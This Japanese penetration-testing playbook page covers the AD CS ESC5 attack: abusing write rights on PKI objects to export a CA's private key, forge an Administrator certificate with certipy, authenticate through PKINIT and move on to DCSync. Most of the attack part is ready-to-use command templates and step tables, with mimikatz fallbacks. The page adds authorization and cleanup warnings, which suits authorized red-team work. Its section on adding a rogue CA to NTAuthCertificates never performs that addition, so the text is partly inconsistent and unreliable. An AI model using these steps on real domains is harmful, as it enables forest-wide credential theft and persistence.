# ESC5 — PKI オブジェクトへの過剰な Write ACL

> **スコープ**: 低権限ユーザーが CA オブジェクト / NTAuthCertificates / CA ホストコンピューターオブジェクトに Write 権限を持つ場合に PKI 基盤自体を悪用する。CA ホスト経由 RBCD〜NTAuthCertificates への不正 CA 証明書追加まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 不可逆な設定変更を含む（CA オブジェクト・PKI コンテナへの書き込みはドメイン全体の PKI 基盤に影響）
> - [x] 持続化に該当（発行した証明書・配置した CA 証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4662・4886・4887・MDI アラート）
> - [x] 業務停止リスク（CA オブジェクトの誤操作は PKI 全体の停止につながる）
>
> 実施可否は事前合意で明示確認すること。CA オブジェクトへの変更は書面承認必須。演習環境では制約なし。

## 着火条件

低権限ユーザーが以下の AD オブジェクトのいずれかに Write 権限を持つ：

- **CA サーバーオブジェクト**（`CN=[CA_NAME],CN=Enrollment Services,...`）の `WriteProperty` / `GenericAll`
- **NTAuthCertificates** オブジェクトの `WriteProperty`
- **RootCA** オブジェクトへの Write 権限
- **CA ホストコンピューターオブジェクト**（`CN=[CA_SERVER],CN=Computers,...`）への GenericAll

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `certipy`（`pip install certipy-ad --break-system-packages`）/ Impacket スイート（標準搭載）

## 先に確認すること

**対象オブジェクト別の悪用手法と優先順位:**

| 対象オブジェクト | Write 権限の意味 | 直接の成果 |
|---------------|--------------|-----------|
| CA ホストコンピューターオブジェクトへの GenericAll | RBCD 設定 → CA サーバーに SYSTEM 権限でアクセス | CA 秘密鍵の取得・設定直接変更 |
| NTAuthCertificates への WriteProperty | 不正 CA 証明書の追加 → 不正 CA 発行の証明書で PKINIT が通る | 任意ユーザーとして TGT 取得 |
| CA Enrollment Services オブジェクトへの WriteProperty | CA のテンプレートリストや設定の変更 | ESC4 相当の成果 |
| RootCA オブジェクトへの Write | ルート CA 証明書の置き換え | PKI 基盤全体への影響（最高リスク）|

**攻撃者の思考トレース:** ESC4 がテンプレートオブジェクトへの書き込みなら、ESC5 は PKI 基盤オブジェクト自体への書き込み。最も深刻なのは NTAuthCertificates への Write で、ここに不正 CA の証明書を追加すれば、その不正 CA が発行したどんな証明書でも PKINIT に使えるようになる。

---

## 1. PKI オブジェクトの確認

**コマンド:**

```bash
# [Attacker] PKI オブジェクトの ACL 確認（ESC5 を含む）
certipy find -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -vulnerable -stdout
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| CA ホストコンピューターへの GenericAll | RBCD 経由でシステム権限 | §2 RBCD ケースへ |
| NTAuthCertificates への WriteProperty | 不正 CA 証明書の追加 | §3 NTAuthCertificates ケースへ |
| CA Enrollment Services への WriteProperty | ESC4 相当 | `ESC4.md` の手順を PKI オブジェクトに適用 |

---

## 2. ケース1: CA ホストコンピューターオブジェクトへの GenericAll → RBCD 経由

CA サーバーのコンピューターオブジェクトに GenericAll があれば、RBCD を設定して CA サーバーに SYSTEM 権限でアクセスできる。

**詳細手順 → `../Delegation_Attacks/RBCD.md`**

```bash
# [Target: CA_SERVER] SYSTEM 権限取得後、CA の秘密鍵ダンプ
certutil -p [EXPORT_PASSWORD] -exportPFX [CA_CERT_CN] [OUTPUT.pfx]
```

または Impacket で CA サーバーのシークレットダンプ → `../Credential_Dumping.md`

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| CA 秘密鍵の PFX が取得できる | CA 秘密鍵取得成功 | `certipy forge` で証明書偽造 → PKINIT → DCSync |

---

## 3. ケース2: NTAuthCertificates への WriteProperty → 不正 CA 証明書の追加

**コマンド:**

```bash
# [Attacker] Step 1: 偽造証明書の生成（CA 秘密鍵が取得できている場合）
certipy forge \
  -ca-pfx [CA].pfx \
  -upn administrator@[DOMAIN] \
  -subject "CN=Administrator"
# → administrator_forged.pfx が生成される

# [Attacker] Step 2: 偽造証明書で PKINIT 認証
certipy auth -pfx administrator_forged.pfx -dc-ip [DC_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| NT ハッシュが出力される | 証明書偽造 + PKINIT 成功 | DCSync → `../Credential_Dumping.md` |

**注意:** NTAuthCertificates への書き込みは AD フォレスト全体に影響する最高リスク操作。追加した CA 証明書はテスト完了時に必ず削除する。

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| CA ホストへの GenericAll があるが RBCD が設定できない | `MachineAccountQuota` が 0 の場合。既存のコンピューターオブジェクトを `msDS-AllowedToActOnBehalfOfOtherIdentity` に設定できるか確認 |
| CA 秘密鍵のエクスポートが拒否される | CA の秘密鍵が非エクスポート属性（CNG KSP）で保存されている。`mimikatz crypto::capi` / `lsadump::dpapi` による別アプローチ |

---

## 注意点・落とし穴

- **ESC5 の影響範囲は最も広い**: CA オブジェクトへの変更はドメイン全体・フォレスト全体に波及する場合がある
- **`NTAuthCertificates` への不正な CA 証明書追加は削除が必要**: 追加した証明書はテスト完了時に必ず削除する
- **CA 秘密鍵の取得は最高リスク**: CA 秘密鍵が漏洩した場合、フォレスト全体の PKI 再構築が必要になる

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須・経営層承認が必要な場合も）。PKI 基盤への変更はフォレスト全体への影響
- **想定されるSIEM/EDR検知**: Event ID 4662（PKI オブジェクト変更）/ 4886・4887（証明書発行）/ MDI「疑わしいドメインコントローラーへの証明書要求」
- **業務影響リスク**: CA オブジェクトの誤操作は PKI 全体の停止につながる最高リスク
- **原状回復必須項目**: ✅ NTAuthCertificates に追加した CA 証明書の削除 / ✅ CA オブジェクトの設定復元 / ✅ 取得した CA 秘密鍵・pfx の厳重管理・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：CA ホストへの RBCD 設定 → `../Delegation_Attacks/RBCD.md`
- 後：CA 秘密鍵取得後の証明書偽造 → PKINIT → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
